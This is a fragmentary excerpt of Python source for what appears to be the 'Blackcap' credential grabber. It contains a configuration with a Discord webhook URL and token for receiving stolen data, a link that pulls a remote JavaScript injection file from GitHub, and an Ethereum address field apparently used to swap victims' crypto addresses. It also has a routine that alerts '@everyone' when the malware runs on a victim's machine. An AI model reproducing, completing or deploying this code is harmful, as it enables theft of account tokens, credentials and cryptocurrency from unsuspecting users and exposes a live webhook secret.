...
__config__ = {
    "yourwebhookurl": "%https://discord.com/api/webhooks/1084101920135860244/ecr4xE_IV7BouzqlP0R2Kxk6-1xs3quGKO6zbyqHSn9EOc_owND-C5k6eFdc_q8TjpZ6%",
    "bc_injection_url": "https://raw.githubusercontent.com/WAJLgit/blackcapper-Inject/main/index.js",
    "hide": "%_hide_script%",
    "ping": "%ping_enabled%",
    "pingtype": "%ping_type%",
    ...
    "addresse_eth": "%0xc0C5E0114f5D83eb89AdDf5a9daF36a667200da4%",
...
class first_function_bc(Functions):
    ...
    def ping_on_running(self: str) -> str:
        ping1 = {
            "avatar_url": "https://raw.githubusercontent.com/WAJLgit/black-capper-asssets/main/blackcap%20(2).png",
            "content": "@everyone",
        }
        ping2 = {
            "avatar_url": "https://raw.githubusercontent.com/WAJLgit/black-capper-asssets/main/blackcap%20(2).png",
            ...
            "embeds": [
                {
                    "author": {
                        ...
                        "url": "https://github.com/WAJLgit",
                        "icon_url": "https://raw.githubusercontent.com/WAJLgit/black-capper-asssets/main/mona-loading-dark.gif",
                    },
                    "color": 374276,
...
def writeforfile(data, name):
    ...
    with open(path, mode="w", encoding="utf-8") as f:
        f.write(f"Created by KSCH | https://github.com/WAJLgit\n\n")
        for line in data:
            if line[0] != "":
                f.write(f"{line}\n")
